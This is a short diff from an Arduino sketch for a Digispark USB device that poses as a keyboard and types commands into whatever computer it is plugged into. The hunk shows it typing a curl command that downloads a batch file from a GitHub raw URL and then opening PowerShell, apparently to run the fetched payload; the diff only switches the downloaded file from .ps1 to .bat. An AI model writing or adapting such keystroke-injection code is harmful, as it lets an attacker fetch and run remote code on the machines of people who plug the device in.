@@ -31,7 +31,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_BACKSLASH);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
-  DigiKeyboard.print("curl https://raw.githubusercontent.com/randomguyhehehe/lol/main/lol.ps1 > lol.bat");
+  DigiKeyboard.print("curl https://raw.githubusercontent.com/randomguyhehehe/lol/main/lol.bat > lol.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell");
